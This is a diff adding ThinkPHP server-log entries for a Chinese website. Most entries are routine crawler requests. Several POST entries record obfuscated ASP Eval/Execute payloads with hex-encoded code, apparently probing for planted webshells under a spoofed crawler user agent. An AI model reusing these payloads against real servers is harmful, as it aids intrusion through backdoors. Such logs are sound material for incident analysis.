+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'API',
+    1 => 'handui.aspx',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'fw366.cn',
+  'content-length' => '684',
+  'x-forwarded-for' => '58.155.155.190',
+  'user-agent' => 'Mozilla/5.0 (compatible; Yahoo! Slurp China; http://misc.yahoo.com.cn/help.html)',
+  'referer' => 'http://misc.yahoo.com.cn/',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'content-type' => 'application/x-www-form-urlencoded; Charset=UTF-8',
+  'via' => '58.155.155.190',
+  'connection' => 'Keep-Alive',
+)
+[ info ] [ PARAM ] array (
+  'xise' => '%u0045%xec%ute%G%loba%l%(Replace("Fu%nct%ion bd(by%V%al s):Fo%r i%=1 T%o Le%n(s) S%te%p 2:c%=M%id(s,i,2):If Is%Nu%meric(M%id(s,i,1)) T%hen:bd%=bd@26@c%hr(""@26@H""@26@c):E%lse:bd%=bd@26@c%hr(""@26@H""@26@c@26@M%id(s,i+2,2)):i%=i+2:E%nd If:Ne%xt:E%nd Fu%nct%ion:E%xecu%te%(bd%(""4f6e204572726f7220526573756d65204e6578743a526573706f6e73652e57726974652022402a6c786c2a40223a526573706F6E73652E577269746528224C584C22293a526573706f6e73652e577269746520222a406c786c402a223a526573706f6e73652e456e64"")%)","@26@",chr(38)))',
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002013s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T08:34:01+08:00 ] 61.178.52.153 POST fw366.cn//API/handui.aspx
+[运行时间：0.042589s] [吞吐率：23.48req/s] [内存消耗：2,474.47kb] [文件加载：120]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000031s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003153s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003180s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'API',
+    1 => 'handui.aspx',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'fw366.cn',
+  'content-length' => '816',
+  'x-forwarded-for' => '61.178.52.153',
+  'user-agent' => 'Mozilla/5.0 (compatible; Yahoo! Slurp China; http://misc.yahoo.com.cn/help.html)',
+  'referer' => 'http://misc.yahoo.com.cn/',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'content-type' => 'application/x-www-form-urlencoded; Charset=UTF-8',
+  'via' => '61.178.52.153',
+  'connection' => 'Keep-Alive',
+)
+[ info ] [ PARAM ] array (
+  'z' => 'Ev al ("Ex"&"e"&"cute(""Server.ScriptTimeout=3600:On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=M"&"i"&"d(s,i,2):If IsNumeric(M"&"i"&"d(s,i,1)) Then:Ex"&"e"&"cute(""""bd=bd&c"&"h"&"r(&H""""&c&"""")""""):Else:Ex"&"e"&"cute(""""bd=bd&c"&"h"&"r(&H""""&c&M"&"i"&"d(s,i+2,2)&"""")""""):i=i+2:End If""&c"&"h"&"r(10)&""Next:End Function:Response.Write(""""@*lxl*@""""):Ex"&"e"&"cute(""""On Error Resume Next:""""&bd(""""526573706F6E73652E577269746528224C584C2229"""")):Response.Write(""""*@lxl@*""""):Response.End"")")',
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002015s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T08:34:02+08:00 ] 124.221.28.236 POST fw366.cn//API/handui.aspx
+[运行时间：0.041778s] [吞吐率：23.94req/s] [内存消耗：2,474.34kb] [文件加载：120]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000027s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003143s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003171s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'API',
+    1 => 'handui.aspx',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'fw366.cn',
+  'content-length' => '681',
+  'x-forwarded-for' => '124.221.28.236',
+  'user-agent' => 'Mozilla/5.0 (compatible; Yahoo! Slurp China; http://misc.yahoo.com.cn/help.html)',
+  'referer' => 'http://misc.yahoo.com.cn/',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'content-type' => 'application/x-www-form-urlencoded; Charset=UTF-8',
+  'via' => '124.221.28.236',
+  'connection' => 'Keep-Alive',
+)
+[ info ] [ PARAM ] array (
+  'z' => '%u0045%xec%ute%G%loba%l%(Replace("Fu%nct%ion bd(by%V%al s):Fo%r i%=1 T%o Le%n(s) S%te%p 2:c%=M%id(s,i,2):If Is%Nu%meric(M%id(s,i,1)) T%hen:bd%=bd@26@c%hr(""@26@H""@26@c):E%lse:bd%=bd@26@c%hr(""@26@H""@26@c@26@M%id(s,i+2,2)):i%=i+2:E%nd If:Ne%xt:E%nd Fu%nct%ion:E%xecu%te%(bd%(""4f6e204572726f7220526573756d65204e6578743a526573706f6e73652e57726974652022402a6c786c2a40223a526573706F6E73652E577269746528224C584C22293a526573706f6e73652e577269746520222a406c786c402a223a526573706f6e73652e456e64"")%)","@26@",chr(38)))',
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002018s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T09:00:06+08:00 ] 183.136.225.57 GET www.fw366.cn/
+[运行时间：0.047620s] [吞吐率：21.00req/s] [内存消耗：2,930.69kb] [文件加载：124]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000028s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003173s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003200s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'keep-alive',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0',
+  'host' => 'www.fw366.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001919s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/fw366.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/fw366.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T09:17:43+08:00 ] 54.38.123.240 GET fw366.cn/
+[运行时间：0.045945s] [吞吐率：21.77req/s] [内存消耗：2,899.31kb] [文件加载：121]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000029s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003151s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003178s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+  'upgrade-insecure-requests' => '1',
+  'host' => 'fw366.cn',
+  'connection' => 'keep-alive',
+  'accept-language' => 'en-US,en;q=0.9',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002002s ]
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/fw366.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/fw366.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T09:46:29+08:00 ] 218.30.139.170 POST www.fw366.cn//api/javascript/javascript.asp
+[运行时间：0.042888s] [吞吐率：23.32req/s] [内存消耗：2,474.64kb] [文件加载：120]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000028s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003132s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003159s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'javascript',
+    2 => 'javascript.asp',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'www.fw366.cn',
+  'content-length' => '819',
+  'x-forwarded-for' => '218.30.139.170',
+  'user-agent' => 'Mozilla/5.0 (compatible; Yahoo! Slurp China; http://misc.yahoo.com.cn/help.html)',
+  'referer' => 'http://misc.yahoo.com.cn/',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'content-type' => 'application/x-www-form-urlencoded; Charset=UTF-8',
+  'via' => '218.30.139.170',
+  'connection' => 'Keep-Alive',
+)
+[ info ] [ PARAM ] array (
+  'abcd' => 'Ev al ("Ex"&"e"&"cute(""Server.ScriptTimeout=3600:On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=M"&"i"&"d(s,i,2):If IsNumeric(M"&"i"&"d(s,i,1)) Then:Ex"&"e"&"cute(""""bd=bd&c"&"h"&"r(&H""""&c&"""")""""):Else:Ex"&"e"&"cute(""""bd=bd&c"&"h"&"r(&H""""&c&M"&"i"&"d(s,i+2,2)&"""")""""):i=i+2:End If""&c"&"h"&"r(10)&""Next:End Function:Response.Write(""""@*lxl*@""""):Ex"&"e"&"cute(""""On Error Resume Next:""""&bd(""""526573706F6E73652E577269746528224C584C2229"""")):Response.Write(""""*@lxl@*""""):Response.End"")")',
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002015s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T09:46:30+08:00 ] 119.40.197.178 POST www.fw366.cn//api/javascript/javascript.asp
+[运行时间：0.042464s] [吞吐率：23.55req/s] [内存消耗：2,474.52kb] [文件加载：120]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000028s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003185s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003213s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'javascript',
+    2 => 'javascript.asp',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'www.fw366.cn',
+  'content-length' => '684',
+  'x-forwarded-for' => '119.40.197.178',
+  'user-agent' => 'Mozilla/5.0 (compatible; Yahoo! Slurp China; http://misc.yahoo.com.cn/help.html)',
+  'referer' => 'http://misc.yahoo.com.cn/',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'content-type' => 'application/x-www-form-urlencoded; Charset=UTF-8',
+  'via' => '119.40.197.178',
+  'connection' => 'Keep-Alive',
+)
+[ info ] [ PARAM ] array (
+  'abcd' => '%u0045%xec%ute%G%loba%l%(Replace("Fu%nct%ion bd(by%V%al s):Fo%r i%=1 T%o Le%n(s) S%te%p 2:c%=M%id(s,i,2):If Is%Nu%meric(M%id(s,i,1)) T%hen:bd%=bd@26@c%hr(""@26@H""@26@c):E%lse:bd%=bd@26@c%hr(""@26@H""@26@c@26@M%id(s,i+2,2)):i%=i+2:E%nd If:Ne%xt:E%nd Fu%nct%ion:E%xecu%te%(bd%(""4f6e204572726f7220526573756d65204e6578743a526573706f6e73652e57726974652022402a6c786c2a40223a526573706F6E73652E577269746528224C584C22293a526573706f6e73652e577269746520222a406c786c402a223a526573706f6e73652e456e64"")%)","@26@",chr(38)))',
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002036s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T10:30:33+08:00 ] 203.208.60.127 GET www.fw366.cn/
+[运行时间：0.048429s] [吞吐率：20.65req/s] [内存消耗：2,934.20kb] [文件加载：124]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000027s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003258s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003285s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip,deflate,br',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.92 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+  'from' => 'googlebot(at)googlebot.com',
+  'accept' => 'text/html,application/xhtml+xml,application/signed-exchange;v=b3,application/xml;q=0.9,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'amp-cache-transform' => 'google;v="1..3"',
+  'host' => 'www.fw366.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002053s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/fw366.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/fw366.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T10:30:35+08:00 ] 203.208.60.43 GET www.fw366.cn/
+[运行时间：0.047985s] [吞吐率：20.84req/s] [内存消耗：2,934.20kb] [文件加载：124]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000027s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003166s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003207s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip,deflate,br',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+  'from' => 'googlebot(at)googlebot.com',
+  'accept' => 'text/html,application/xhtml+xml,application/signed-exchange;v=b3,application/xml;q=0.9,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'amp-cache-transform' => 'google;v="1..3"',
+  'host' => 'www.fw366.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002038s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/fw366.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/fw366.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T10:38:15+08:00 ] 203.208.60.20 GET www.fw366.cn/index/user/index.html
+[运行时间：0.058888s] [吞吐率：16.98req/s] [内存消耗：3,640.89kb] [文件加载：131]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000030s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003208s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003236s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip,deflate,br',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+  'from' => 'googlebot(at)googlebot.com',
+  'accept' => 'text/html,application/xhtml+xml,application/signed-exchange;v=b3,application/xml;q=0.9,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'amp-cache-transform' => 'google;v="1..3"',
+  'host' => 'www.fw366.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002058s ]
+[ info ] [ TOKEN ] INIT Mysql
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /www/wwwroot/fw366.cn/public/../application/common/view/tpl/dispatch_jump.tpl [ array (
+  0 => 'code',
+  1 => 'msg',
+  2 => 'data',
+  3 => 'url',
+  4 => 'wait',
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T10:38:21+08:00 ] 203.208.60.28 GET www.fw366.cn/index/user/login.html
+[运行时间：0.049151s] [吞吐率：20.35req/s] [内存消耗：2,964.23kb] [文件加载：121]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000027s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003270s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003298s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip,deflate,br',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.92 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+  'from' => 'googlebot(at)googlebot.com',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'referer' => 'http://www.fw366.cn/index/user/index.html',
+  'accept-language' => 'en-US',
+  'host' => 'www.fw366.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002104s ]
+[ info ] [ RUN ] app\index\controller\User->login[ /www/wwwroot/fw366.cn/application/index/controller/User.php ]
+[ info ] [ VIEW ] /www/wwwroot/fw366.cn/public/../application/index/view/user/login.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+  3 => 'url',
+  4 => 'title',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T10:38:41+08:00 ] 203.208.60.29 GET www.fw366.cn/index/ajax/lang?callback=define&controllername=user&v=1586304000
+[运行时间：0.048148s] [吞吐率：20.77req/s] [内存消耗：2,908.87kb] [文件加载：121]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000030s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003210s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003238s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'ajax',
+    2 => 'lang',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip,deflate,br',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.92 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+  'from' => 'googlebot(at)googlebot.com',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+  'referer' => 'http://www.fw366.cn/index/user/login.html',
+  'cookie' => 'PHPSESSID=kl694mb1d71uluu33v5u7pjsb1',
+  'accept-language' => 'en-US',
+  'host' => 'www.fw366.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'callback' => 'define',
+  'controllername' => 'user',
+  'v' => '1586304000',
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002043s ]
+[ info ] [ RUN ] app\index\controller\Ajax->lang[ /www/wwwroot/fw366.cn/application/index/controller/Ajax.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T10:41:04+08:00 ] 203.208.60.28 GET www.fw366.cn/index/user/login.html
+[运行时间：0.050416s] [吞吐率：19.83req/s] [内存消耗：3,010.18kb] [文件加载：124]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000031s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003266s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003294s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip,deflate,br',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+  'from' => 'googlebot(at)googlebot.com',
+  'accept' => 'text/html,application/xhtml+xml,application/signed-exchange;v=b3,application/xml;q=0.9,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'amp-cache-transform' => 'google;v="1..3"',
+  'host' => 'www.fw366.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002067s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn/user.php
+[ info ] [ RUN ] app\index\controller\User->login[ /www/wwwroot/fw366.cn/application/index/controller/User.php ]
+[ info ] [ VIEW ] /www/wwwroot/fw366.cn/public/../application/index/view/user/login.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+  3 => 'url',
+  4 => 'title',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T10:41:27+08:00 ] 203.208.60.23 GET www.fw366.cn/index/ajax/lang?callback=define&controllername=user&v=1586304000
+[运行时间：0.048231s] [吞吐率：20.73req/s] [内存消耗：2,908.87kb] [文件加载：121]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000029s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003228s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003256s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'ajax',
+    2 => 'lang',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip,deflate,br',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.92 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+  'from' => 'googlebot(at)googlebot.com',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+  'referer' => 'http://www.fw366.cn/index/user/login.html',
+  'cookie' => 'PHPSESSID=vanetvvj743vb2gad759rsvndo',
+  'accept-language' => 'en-US',
+  'host' => 'www.fw366.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'callback' => 'define',
+  'controllername' => 'user',
+  'v' => '1586304000',
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002070s ]
+[ info ] [ RUN ] app\index\controller\Ajax->lang[ /www/wwwroot/fw366.cn/application/index/controller/Ajax.php ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T10:43:43+08:00 ] 203.208.60.59 GET www.fw366.cn/api/validate/check_sms_correct.html
+[运行时间：0.059990s] [吞吐率：16.67req/s] [内存消耗：3,777.76kb] [文件加载：131]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000041s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003202s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003230s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'validate',
+    2 => 'check_sms_correct',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip,deflate,br',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+  'from' => 'googlebot(at)googlebot.com',
+  'accept' => 'text/html,application/xhtml+xml,application/signed-exchange;v=b3,application/xml;q=0.9,*/*;q=0.8',
+  'connection' => 'keep-alive',
+  'amp-cache-transform' => 'google;v="1..3"',
+  'host' => 'www.fw366.cn',
+  'content-type' => '',
